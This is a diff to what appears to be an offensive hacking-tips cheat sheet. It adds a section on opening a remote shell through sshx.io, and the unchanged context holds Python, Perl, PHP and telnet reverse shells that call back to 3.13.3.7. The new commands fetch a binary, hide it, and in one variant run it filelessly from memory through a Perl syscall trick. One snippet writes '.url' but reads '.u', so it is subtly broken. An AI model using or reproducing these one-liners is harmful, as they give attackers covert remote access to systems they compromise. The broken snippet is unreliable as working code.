@@ -63,6 +63,7 @@ Got tricks? Join us [https://thc.org/ops](https://thc.org/ops)
       3. [with OpenSSL (encrypted)](#sslshell)
       1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
       1. [without /dev/tcp](#reverse-shell-no-bash)
+      2. [with sshx.io (encrypted)](#sshx)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -1612,8 +1613,26 @@ touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
 ```
 Note: Dont forget to `rm /tmp/.fio` after login.
 
+<a id="sshx"></a>
+**5.i.g. Reverse shell with sshx.io (encrypted)**
+
+Access a remote shell from your web browser [https://sshx.io](https://sshx.io).
+
+```shell
+curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null >.s \
+&& chmod 755 .s \
+&& (PATH=.:$PATH s -q >.url 2>/dev/null &);
+for x in {0..10}; do [ -f .url ] && break;sleep 1; done;
+cat .u;rm -rf .u .s;
+```
+
+Or pipe directly into memory:
+```shell
+cd /tmp;(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null|perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",@ARGV' -- "-q" >.u 2>/dev/null &);sleep 10;cat .u&&rm -f .u
+```
+
 <a id="revese-shell-remote-moe"></a>
-**5.i.g. Reverse shell with remote.moe and ssh (encrypted)**
+**5.i.h. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
@@ -1640,13 +1659,13 @@ rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p &
 ```
 
 <a id="reverse-shell-python"></a>
-**5.i.h. Reverse shell with Python**
+**5.i.i. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.i. Reverse shell with Perl**
+**5.i.j. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -1655,7 +1674,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.j. Reverse shell with PHP**
+**5.i.k. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
